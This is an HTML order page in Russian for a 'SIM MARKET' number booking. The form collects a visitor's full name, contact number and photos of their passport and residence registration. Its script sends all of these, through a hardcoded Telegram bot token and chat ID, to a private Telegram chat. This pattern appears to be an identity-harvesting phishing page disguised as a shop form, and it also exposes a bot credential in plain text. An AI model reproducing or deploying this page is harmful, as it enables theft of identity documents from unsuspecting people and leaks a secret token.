<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIM MARKET | Заявка</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0b0f1a; color: #f8fafc; font-family: sans-serif; }
        .gold-text { color: #fbbf24; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(251, 191, 36, 0.4); }
    </style>
</head>
<body class="p-4 flex flex-col items-center min-h-screen justify-center">

    <div class="max-w-md w-full glass p-8 rounded-[2.5rem] shadow-2xl">
        <h3 class="text-xl font-bold text-center mb-6 uppercase gold-text">Оформление заказа</h3>
        
        <form id="regForm" class="space-y-4">
            <input type="text" id="phone_num" placeholder="Выбранный номер" class="w-full bg-slate-900/50 p-4 rounded-2xl border border-slate-800 outline-none text-yellow-500 font-bold" required>
            <input type="text" id="user_name" placeholder="Ваше ФИО" class="w-full bg-slate-900/50 p-4 rounded-2xl border border-slate-800 outline-none text-white" required>
            <input type="text" id="user_contact" placeholder="Ваш номер для связи" class="w-full bg-slate-900/50 p-4 rounded-2xl border border-slate-800 outline-none text-white" required>

            <div class="grid grid-cols-2 gap-2">
                <div class="relative border border-dashed border-slate-700 p-4 rounded-2xl text-center bg-slate-900/30">
                    <input type="file" id="p1" accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer" required onchange="u('l1')">
                    <span class="text-[10px] text-gray-500 font-bold" id="l1">📸 ПАСПОРТ</span>
                </div>
                <div class="relative border border-dashed border-slate-700 p-4 rounded-2xl text-center bg-slate-900/30">
                    <input type="file" id="p2" accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer" required onchange="u('l2')">
                    <span class="text-[10px] text-gray-500 font-bold" id="l2">🏠 ПРОПИСКА</span>
                </div>
            </div>

            <button type="submit" id="btn" class="w-full bg-yellow-500 text-black font-black py-5 rounded-2xl uppercase shadow-xl transition active:scale-95 mt-4">
                Забронировать
            </button>
        </form>
        <p id="st" class="mt-4 text-center text-xs font-bold"></p>
    </div>

    <script>
        const T = "8666944440:AAFAmQuYaYmnJjhuQ9AmdBQim9V-kxNnxAo";
        const ID = "8768514374";

        function u(i) { document.getElementById(i).innerText = "✅ ГОТОВО"; document.getElementById(i).style.color = "#fbbf24"; }

        document.getElementById('regForm').onsubmit = async (e) => {
            e.preventDefault();
            const b = document.getElementById('btn');
            const st = document.getElementById('st');
            b.disabled = true;
            b.innerText = "ОТПРАВКА...";
            
            const msg = `🆕 ЗАЯВКА С САЙТА\n\n📱 Номер: ${document.getElementById('phone_num').value}\n👤 ФИО: ${document.getElementById('user_name').value}\n📞 Контакт: ${document.getElementById('user_contact').value}`;

            try {
                // 1. Отправляем текст (это работает почти всегда)
                const textRes = await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: ID, text: msg})
                });

                if (!textRes.ok) throw new Error('Ошибка текста');

                // 2. Отправляем фото 1
                const fd1 = new FormData();
                fd1.append('chat_id', ID);
                fd1.append('photo', document.getElementById('p1').files[0]);
                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method: 'POST', body: fd1});

                // 3. Отправляем фото 2
                const fd2 = new FormData();
                fd2.append('chat_id', ID);
                fd2.append('photo', document.getElementById('p2').files[0]);
                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method: 'POST', body: fd2});
                
                st.innerText = "✅ ЗАЯВКА ОТПРАВЛЕНА!";
                st.style.color = "#fbbf24";
                b.innerText = "УСПЕШНО";
                setTimeout(() => location.reload(), 2000);

            } catch (err) {
                console.error(err);
                st.innerText = "❌ ОШИБКА! ПРОВЕРЬТЕ ИНТЕРНЕТ ИЛИ БОТА.";
                st.style.color = "#ff4444";
                b.disabled = false;
                b.innerText = "ПОПРОБОВАТЬ СНОВА";
            }
        };
    </script>
</body>
</html>
